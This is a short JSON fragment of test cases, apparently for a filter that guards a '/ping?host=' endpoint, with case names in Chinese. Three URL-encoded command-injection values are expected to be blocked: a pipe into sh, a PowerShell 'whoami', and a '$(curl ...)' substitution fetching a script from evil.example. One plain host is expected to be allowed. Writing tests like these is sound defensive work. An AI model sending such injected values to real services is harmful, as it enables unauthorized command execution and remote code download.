    {"name": "管道交给 sh 解释器", "location": "url", "expect": "block", "path": "/ping?host=127.0.0.1%7Csh"},
    {"name": "PowerShell 执行", "location": "url", "expect": "block", "path": "/ping?host=%3Bpowershell%20-c%20whoami"},
    {"name": "命令替换内嵌 curl", "location": "url", "expect": "block", "path": "/ping?host=%24(curl%20http://evil.example/x.sh)"},
    {"name": "正常主机地址", "location": "url", "expect": "allow", "path": "/ping?host=127.0.0.1"}
